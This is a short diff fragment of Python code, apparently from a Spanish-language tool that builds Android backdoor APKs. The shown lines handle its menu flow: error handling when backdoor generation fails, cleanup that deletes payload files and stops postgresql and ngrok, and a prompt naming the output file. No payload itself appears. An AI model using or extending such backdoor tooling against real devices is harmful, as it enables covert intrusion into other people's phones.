+									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+									os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
+									banner(), menu(), options()	
+						else:
+							print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
+							time.sleep(3)
+							os.system('rm -rf output/payload output/payload.apk output/kithack.apk')							
+							pause("{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()
+
+					# Salida de bucle
+					OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))						
 					mainout = os.path.splitext(OUT)[0]
 					print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
 					time.sleep(4)
